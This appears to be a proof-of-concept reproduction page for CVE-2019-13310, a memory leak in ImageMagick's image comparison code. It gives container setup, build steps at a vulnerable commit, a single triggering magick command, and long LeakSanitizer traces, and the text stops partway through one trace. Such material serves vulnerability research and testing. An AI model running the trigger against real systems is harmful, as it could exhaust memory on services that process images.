### CVE-2019-13310

### PoC Links
[Github.com](https://github.com/ImageMagick/ImageMagick/issues/1616)

### Docker Container Run Command
```shell
docker build -t cve-2019-13310-poc .
docker run --privileged --cap-add sys_ptrace  --security-opt seccomp=unconfined -itd --name CVE-2019-13310-POC cve-2019-13310-poc
docker exec -it CVE-2019-13310-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:ImageMagick/ImageMagick.git

# Rollback to the vulnerable version.
cd ImageMagick/
git reset --hard 63bf487f438e051094b92b570aff08efe7068f79

# Install the compilation and installation dependencies.
apt install gcc gdb make pkg-config libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
CFLAGS="-O0 -g -fsanitize=address" ./configure --disable-openmp
make -j$(nproc)
make install
ldconfig

# exec the poc
magick -seed 0 -quality 3 "(" magick:logo +repage ")" "(" magick:wizard +repage ")" -quiet -caption "%h%U" -compare -insert 2   tmp

```
### Description
Observed that:
```shell
magick: no such image '-insert' '2' at CLI arg 17 @ error/operation.c/CLIListOperatorImages/4174.


=================================================================
==28485==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 13504 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5ef3c40 in AcquireCriticalMemory MagickCore/memory-private.h:64
#3 0xffffb5ef7ab4 in CloneImage MagickCore/image.c:823
#4 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#5 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#6 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#7 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#8 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#9 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#10 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#11 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#12 0xaaaab2d104d8 in main utilities/magick.c:180
#13 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#14 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#15 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 6553600 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb5f33798 in AcquireAlignedMemory MagickCore/memory.c:265
#2 0xffffb5d9f608 in OpenPixelCache MagickCore/cache.c:3728
#3 0xffffb5d97b98 in GetImagePixelCache MagickCore/cache.c:1754
#4 0xffffb5da23b8 in QueueAuthenticPixelCacheNexus MagickCore/cache.c:4156
#5 0xffffb5d95d1c in GetAuthenticPixelCacheNexus MagickCore/cache.c:1324
#6 0xffffb5dab174 in GetCacheViewAuthenticPixels MagickCore/cache-view.c:312
#7 0xffffb5effb28 in SetImageAlpha MagickCore/image.c:2372
#8 0xffffb5f655f0 in ConformPixelInfo MagickCore/pixel.c:235
#9 0xffffb5effee4 in SetImageBackgroundColor MagickCore/image.c:2441
#10 0xffffb606c6bc in ExtentImage MagickCore/transform.c:1138
#11 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#12 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#13 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#14 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#15 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#16 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#17 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#18 0xaaaab2d104d8 in main utilities/magick.c:180
#19 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#20 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#21 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 22616 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb5ef89e4 in CloneImage MagickCore/image.c:879
#4 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#5 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#6 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#7 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#8 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#9 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#10 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#11 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#12 0xaaaab2d104d8 in main utilities/magick.c:180
#13 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#14 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#15 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 13024 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5ef3c40 in AcquireCriticalMemory MagickCore/memory-private.h:64
#3 0xffffb5ef6088 in AcquireImageInfo MagickCore/image.c:350
#4 0xffffb5ef9024 in CloneImageInfo MagickCore/image.c:945
#5 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#6 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#7 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#8 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#9 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#10 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#11 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#12 0xaaaab2d104d8 in main utilities/magick.c:180
#13 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#14 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#15 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 9152 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb5f33798 in AcquireAlignedMemory MagickCore/memory.c:265
#2 0xffffb5d903e0 in AcquirePixelCache MagickCore/cache.c:195
#3 0xffffb5d91b10 in ClonePixelCache MagickCore/cache.c:513
#4 0xffffb5ef8fb0 in CloneImage MagickCore/image.c:910
#5 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#6 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#7 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#8 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#9 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#10 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#11 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#12 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#13 0xaaaab2d104d8 in main utilities/magick.c:180
#14 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#15 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#16 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 512 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb5f64c90 in AcquirePixelChannelMap MagickCore/pixel.c:101
#4 0xffffb5f64e40 in ClonePixelChannelMap MagickCore/pixel.c:139
#5 0xffffb5ef845c in CloneImage MagickCore/image.c:849
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 272 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5d75d14 in AcquireCriticalMemory MagickCore/memory-private.h:64
#3 0xffffb5d76ebc in CloneBlobInfo MagickCore/blob.c:554
#4 0xffffb5ef87c8 in CloneImage MagickCore/image.c:867
#5 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#6 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#7 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#8 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#9 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#10 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#11 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#12 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#13 0xaaaab2d104d8 in main utilities/magick.c:180
#14 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#15 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#16 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 192 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb5d90d48 in AcquirePixelCacheNexus MagickCore/cache.c:271
#4 0xffffb5d90850 in AcquirePixelCache MagickCore/cache.c:212
#5 0xffffb5d91b10 in ClonePixelCache MagickCore/cache.c:513
#6 0xffffb5ef8fb0 in CloneImage MagickCore/image.c:910
#7 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#8 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#9 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#10 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#11 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#12 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#13 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#14 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#15 0xaaaab2d104d8 in main utilities/magick.c:180
#16 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#17 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#18 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb5d90b5c in AcquirePixelCache MagickCore/cache.c:231
#4 0xffffb5d91b10 in ClonePixelCache MagickCore/cache.c:513
#5 0xffffb5ef8fb0 in CloneImage MagickCore/image.c:910
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb6035c8c in NewSplayTree MagickCore/splay-tree.c:1159
#4 0xffffb6032a00 in CloneSplayTree MagickCore/splay-tree.c:360
#5 0xffffb5f55fb0 in CloneImageOptions MagickCore/option.c:2144
#6 0xffffb5efa87c in CloneImageInfo MagickCore/image.c:1010
#7 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#8 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#9 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb6035c8c in NewSplayTree MagickCore/splay-tree.c:1159
#4 0xffffb6032a00 in CloneSplayTree MagickCore/splay-tree.c:360
#5 0xffffb5f99f7c in CloneImageProperties MagickCore/property.c:196
#6 0xffffb5ef8170 in CloneImage MagickCore/image.c:839
#7 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#8 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#9 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#10 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#11 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#12 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#13 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#14 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#15 0xaaaab2d104d8 in main utilities/magick.c:180
#16 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#17 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#18 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb5d7c260 in GetBlobInfo MagickCore/blob.c:1745
#4 0xffffb5d76ec8 in CloneBlobInfo MagickCore/blob.c:555
#5 0xffffb5ef87c8 in CloneImage MagickCore/image.c:867
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb5ef8908 in CloneImage MagickCore/image.c:871
#4 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#5 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#6 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#7 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#8 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#9 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#10 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#11 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#12 0xaaaab2d104d8 in main utilities/magick.c:180
#13 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#14 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#15 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 128 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb6022dd8 in AcquireSemaphoreMemory MagickCore/semaphore.c:154
#2 0xffffb6022f7c in AcquireSemaphoreInfo MagickCore/semaphore.c:200
#3 0xffffb5d90af0 in AcquirePixelCache MagickCore/cache.c:229
#4 0xffffb5d91b10 in ClonePixelCache MagickCore/cache.c:513
#5 0xffffb5ef8fb0 in CloneImage MagickCore/image.c:910
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 96 byte(s) in 3 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb6031e04 in AddValueToSplayTree MagickCore/splay-tree.c:189
#3 0xffffb6032b7c in CloneSplayTree MagickCore/splay-tree.c:372
#4 0xffffb5f99f7c in CloneImageProperties MagickCore/property.c:196
#5 0xffffb5ef8170 in CloneImage MagickCore/image.c:839
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 88 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb603189c in AcquireCriticalMemory MagickCore/memory-private.h:64
#3 0xffffb6035a88 in NewSplayTree MagickCore/splay-tree.c:1148
#4 0xffffb6032a00 in CloneSplayTree MagickCore/splay-tree.c:360
#5 0xffffb5f99f7c in CloneImageProperties MagickCore/property.c:196
#6 0xffffb5ef8170 in CloneImage MagickCore/image.c:839
#7 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#8 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#9 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#10 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#11 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#12 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#13 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#14 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#15 0xaaaab2d104d8 in main utilities/magick.c:180
#16 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#17 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#18 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 88 byte(s) in 1 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb603189c in AcquireCriticalMemory MagickCore/memory-private.h:64
#3 0xffffb6035a88 in NewSplayTree MagickCore/splay-tree.c:1148
#4 0xffffb6032a00 in CloneSplayTree MagickCore/splay-tree.c:360
#5 0xffffb5f55fb0 in CloneImageOptions MagickCore/option.c:2144
#6 0xffffb5efa87c in CloneImageInfo MagickCore/image.c:1010
#7 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#8 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#9 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 64 byte(s) in 2 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb6031e04 in AddValueToSplayTree MagickCore/splay-tree.c:189
#3 0xffffb6032b7c in CloneSplayTree MagickCore/splay-tree.c:372
#4 0xffffb5f55fb0 in CloneImageOptions MagickCore/option.c:2144
#5 0xffffb5efa87c in CloneImageInfo MagickCore/image.c:1010
#6 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#7 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#8 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#9 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#10 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#11 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#12 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#13 0xaaaab2d104d8 in main utilities/magick.c:180
#14 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#15 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#16 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 64 byte(s) in 1 object(s) allocated from:
#0 0xffffb665af34 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
#1 0xffffb5f33798 in AcquireAlignedMemory MagickCore/memory.c:265
#2 0xffffb5d90c5c in AcquirePixelCacheNexus MagickCore/cache.c:267
#3 0xffffb5d90850 in AcquirePixelCache MagickCore/cache.c:212
#4 0xffffb5d91b10 in ClonePixelCache MagickCore/cache.c:513
#5 0xffffb5ef8fb0 in CloneImage MagickCore/image.c:910
#6 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#7 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#8 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#9 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 62 byte(s) in 3 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb6059f0c in ConstantString MagickCore/string.c:713
#4 0xffffb6032b6c in CloneSplayTree MagickCore/splay-tree.c:373
#5 0xffffb5f99f7c in CloneImageProperties MagickCore/property.c:196
#6 0xffffb5ef8170 in CloneImage MagickCore/image.c:839
#7 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#8 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#9 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#10 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#11 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#12 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#13 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#14 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#15 0xaaaab2d104d8 in main utilities/magick.c:180
#16 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#17 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#18 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 35 byte(s) in 3 object(s) allocated from:
